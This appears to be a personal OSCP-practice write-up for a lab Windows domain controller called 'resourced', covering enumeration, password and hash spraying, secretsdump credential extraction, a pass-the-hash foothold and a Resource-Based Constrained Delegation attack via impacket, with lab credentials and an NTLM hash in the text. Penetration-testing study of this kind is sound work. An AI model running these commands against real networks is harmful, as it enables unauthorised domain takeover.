@@ -1,0 +1,262 @@
+**Start 14:39 22-05-2025**
+
+---
+```
+Scope:
+192.168.142.175
+```
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -vvvv -p- -Pn -T5 --min-rate=5000 resourced
+
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-22 12:44:20Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-05-22T12:45:08+00:00
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+## Enum4Linux-ng
+
+![](../../../assets/2fb65e5ff3ab471b0b8d464376a77c63.png)
+
+Further down I notice that it is able to enumerate RPC users:
+
+![](../../../assets/6ee542d2730a05f81a13e83c02fe41a9.png)
+
+Most interestingly:
+
+![](../../../assets/fa7aab015a67e09bf1ec7ea737852ecb.png)
+
+This looks like a valid cleartext password, let's password spray it:
+
+![](../../../assets/567f76d2fc05d742daa40aae3846ba5e.png)
+
+It matches, we have a valid set of credentials:
+
+```
+V.Ventz
+HotelCalifornia194!
+```
+
+## 445/TCP - SMB
+
+I first of all try to log into the `Password Audit` share since it looks interesting to me:
+
+![](../../../assets/3c0a16419990a3ba873840f7529f2085.png)
+
+![](../../../assets/c590a9da857e50b26d3d7bace0e2e22d.png)
+
+I had no idea what this was so I looked it up:
+
+![](../../../assets/9854803501c9db8873e5bb7fd96e41f8.png)
+
+![](../../../assets/43e30b4532140f02411c7c067618c7ac.png)
+
+Well well, could be juicy!
+
+![](../../../assets/2763d4cfef86915e42bf43d6d6189ae8.png)
+
+Inside the `registry` directory we also find some good good:
+
+![](../../../assets/e0cc2fe29ccbce9c002f01c9d9fb109d.png)
+
+I did some more research and found the following:
+
+![](../../../assets/c4d600f85617cf80978e526346f23665.png)
+
+So essentially we can now use `impacket-secretsdump` to crack these files.
+
+## secretsdump
+
+![](../../../assets/d2a81f3be836d423b01c83c415657189.png)
+
+![](../../../assets/499c8ae579cebe4906e0a330f7bd4b00.png)
+
+We also get a metric shit ton of `Kerberos` keys:
+
+![](../../../assets/19e40b1bf62debb7e4d0cfbde50eb656.png)
+
+I went ahead and put them into crackstation:
+
+![](../../../assets/1d495d6be98edbd716a87307dc37ca5f.png)
+
+Hell yeah we recovered the *Administrator* hash!
+
+```
+Administrator
+ItachiUchiha888
+```
+
+![](../../../assets/da46c1b2db6626d94197985631b65f0d.png)
+
+However for whatever reason `psexec` failed on me, let's password spray instead.
+
+![](../../../assets/3cd26d08b1c771a4d398733fc25f5fae.png)
+
+We notice that the creds indeed dont match for `smb`, and neither did it work with other services.
+
+I decided to check back on this and do some thorough enumeration with `bloodhound` first.
+
+## BloodHound
+
+![](../../../assets/bb988a6eebe1b9bd097da5b2042ec8ca.png)
+
+![](../../../assets/c8a56c49a6ebe6fc2183eef37574e562.png)
+
+I then checked for the **Shortest paths to Domain Admins** and found this:
+
+![](../../../assets/e56cd64c54d1895fcc25ac762c341dd8.png)
+
+Turns out *L.Livingstone* is quite interesting then.
+
+>[!note]
+>Shortly after getting stuck for a second I found out that you can actually spray **hashes** as well using `nxc` so I went ahead and did that.
+
+### Hash Spray - nxc
+
+![](../../../assets/028beaec1e972f53d6f254a985e70a57.png)
+
+![](../../../assets/5dc34e750e188d026591127a6f8ea095.png)
+
+This thus meant that we could actually get access as *L.Livingstone* using `evil-winrm`, and luckily for us he does indeed happen to be an interesting account.
+
+And the same counted for `rdp`:
+
+![](../../../assets/d763baf0916e42fbef86291095ecab45.png)
+
+However trying to log in via `rdp` failed:
+
+![](../../../assets/329efc9bccb4470b2ba17227cf2e0260.png)
+
+![](../../../assets/ac76f98ced9ba07f4292d227b127c633.png)
+
+# Foothold
+## Pass-The-Hash - evilwinrm
+
+![](../../../assets/e47f5ef8002ea3db3eb55f71ff9c45b1.png)
+
+>[!success]
+>I successfully gained entry using the hash.
+
+### local.txt
+
+![](../../../assets/6923e1c867a0dbcfeffd01e07183e333.png)
+
+## Enumeration
+
+Unfortunately we had absolute dog-tier privs:
+
+![](../../../assets/e55b059fc97af80eb47472c8b3d22985.png)
+
+![](../../../assets/31e7ba83078943d2c485d7b5462a308e.png)
+
+Well what next? I checked `BloodHound` again:
+
+![](../../../assets/57717600bf004bb22a4ee683610e82c0.png)
+
+![](../../../assets/bbdd6ce5caeff6ad102f96cfd12d85a4.png)
+
+>[!note]
+>Ah yes, yet again a **Resource-Based Constrained Delegation** attack, just like in [[Laser#Resource Based Constrained Delegation (RBCD)]] 
+
+## Resource-Based Constrained Delegation (RBCD)
+
+We start off by adding a new computer
+
+```bash
+impacket-addcomputer -computer-name 'evil$' -computer-pass 'Password1' -dc-ip resourced 'resourced.local/L.Livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808'
+```
+
+![](../../../assets/e6964a11af6700dcfc419d3b21cac65e.png)
+
+Then we can check it on `winrm` whether it has been added succesfully:
+
+```powershell
+Get-ADcomputer evil
+```
+
+![](../../../assets/869815afdb41ef8fb67ddbb2b36c100e.png)
+
+Perfect, now the fun part starts.
+
+![](../../../assets/c15a382fb15db9b76a45d39224cb2570.png)
+
+We will now `-delegate-to` the **RESOURSEDC$** computer:
+
+```bash
+impacket-rbcd -delegate-from 'evil$' -delegate-to 'RESOURCEDC$' -action 'write' -dc-ip resourced 'resourced.local/L.Livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808'
+```
+
+![](../../../assets/e9b7b10410971f9c4f643eb0c81b321c.png)
+
+Now we need to go ahead and get the `Service Ticket (ST)`:
+
+```bash
+impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' 'resourced/evil$:Password1' -dc-ip resourced
+```
+
+![](../../../assets/fa905f1241fa38013fc3737e72600ec8.png)
+
+### Exporting ticket
+
+We now export the ticket and in turn list it using `klist`:
+
+```bash
+export KRB5CCNAME=$PWD/Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+klist
+```
+
+![](../../../assets/7d7df66338769d8778aedac06b2cf4d9.png)
+
+## Pass-The-Ticket
+
+We can now easily log in as *Administrator* but first I'll add **resourcedc.resourced.local** to my `/etc/hosts` list to make my life easier:
+
+![](../../../assets/f5a8a91cb06193f96be6707f0d27c178.png)
+
+EZ PZ!
+
+### proof.txt
+
+![](../../../assets/6dc448275861107ad37dd4a3bcbac1dd.png)
+
+---
+
+**Finished 16:41 22-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#RBCD #pass-the-hash #pass-the-ticket #impacket #secretsdump #BloodHound 
